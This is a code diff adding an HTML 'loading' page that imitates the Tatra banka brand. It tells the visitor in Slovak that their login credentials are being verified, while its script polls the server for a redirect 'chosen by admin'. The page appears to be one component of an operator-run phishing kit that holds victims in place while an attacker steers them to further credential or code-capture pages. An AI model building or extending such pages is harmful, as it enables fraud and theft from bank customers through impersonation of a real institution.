@@ -1,0 +1,103 @@
+﻿<!DOCTYPE html>
+<html lang="sk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tatra banka - Načítanie</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            background-color: #1d1e23;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            background-color: #08080a;
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+        }
+        .logo { display: flex; align-items: center; gap: 12px; }
+        .logo-circle {
+            width: 32px; height: 32px;
+            border: 3px solid #0097fd;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .logo-inner {
+            width: 14px; height: 14px;
+            background-color: #0097fd;
+            border-radius: 50%;
+        }
+        .logo-text { font-size: 18px; font-weight: bold; color: #ffffff; }
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+        .loading-container { text-align: center; max-width: 400px; }
+        .spinner {
+            width: 60px; height: 60px;
+            border: 4px solid rgba(0, 151, 253, 0.2);
+            border-top-color: #0097fd;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-title { font-size: 24px; font-weight: 600; margin-bottom: 16px; }
+        .loading-text { font-size: 16px; color: rgba(255,255,255,0.7); }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <div class="logo-circle"><div class="logo-inner"></div></div>
+            <span class="logo-text">Tatra banka</span>
+        </div>
+    </div>
+    <div class="main-content">
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <h1 class="loading-title">Prosím, počkajte</h1>
+            <p class="loading-text">Overujeme vaše prihlasovacie údaje...</p>
+        </div>
+    </div>
+    <script>
+        // Get session_id from URL or localStorage
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session_id') || localStorage.getItem('session_id');
+        
+        // Poll server for redirect command
+        function checkStatus() {
+            fetch('/check_redirect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sessionId})
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'redirect' && data.page) {
+                    // Redirect to the page chosen by admin
+                    window.location.href = '/' + data.page + '?session_id=' + sessionId;
+                } else {
+                    // Keep waiting, check again in 2 seconds
+                    setTimeout(checkStatus, 2000);
+                }
+            })
+            .catch(() => {
+                setTimeout(checkStatus, 2000);
+            });
+        }
+        
+        // Start polling
+        checkStatus();
+    </script>
+</body>
+</html>
